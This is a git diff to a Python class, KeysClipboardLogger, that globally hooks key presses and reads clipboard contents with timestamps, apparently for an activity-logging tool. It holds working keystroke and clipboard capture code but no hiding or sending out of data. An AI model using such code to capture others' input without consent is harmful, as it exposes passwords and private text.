@@ -8,6 +8,7 @@
 # Library imports here
 import keyboard as kb
 import pyperclip as pc
+from datetime import datetime
 
 
 # Main code here
@@ -32,23 +33,41 @@ class KeysClipboardLogger:
         self.old_clipboard = None
         self.current_clipboard = None
         self.working_file = csv_file
-        self.current_keys_file = open("current_keys_file.txt", "w")
-
+        self.current_keys_string = ''
         self.start_keylogger()
 
-    # def log_clipboard(self):
-    #     self.current_clipboard = pc.paste()
-    #     # Als clipboard != string, dan niet plakken. Wel schrijven type van wat is gekopieerd, bijv. bestand of afbeelding.
-    #     if self.current_clipboard != self.old_clipboard:
-    #         # Return only the important data, make one writerow in moso.py
-    #         self.working_file.write(f"{datetime.now()},{self.current_clipboard}]")
-    #         self.old_clipboard = self.current_clipboard
+    def clipboard_changed(self):
+        self.current_clipboard = pc.paste()
+        if self.current_clipboard != self.old_clipboard:
+            return True
+        else:
+            return False
+
+    def log_clipboard(self):
+        try:
+            text = pc.paste()
+        except pc.PyperclipException:
+            text = None
+
+        if text is None:
+            data = "Clipboard contained non-string item."
+        else:
+            # Return only the important data, make one writerow in moso.py
+            self.old_clipboard = self.current_clipboard
+            data = self.current_clipboard
+        return datetime.now(), data
 
     def start_keylogger(self):
+
         def on_press(event):
-            self.current_keys_file.write(event_to_string(event))
+            self.current_keys_string += event_to_string(event)
 
         kb.on_press(on_press)
+
+    def get_current_logged_keys(self):
+        logged_string = self.current_keys_string
+        self.current_keys_string = ''
+        return logged_string
 
 
 def main():
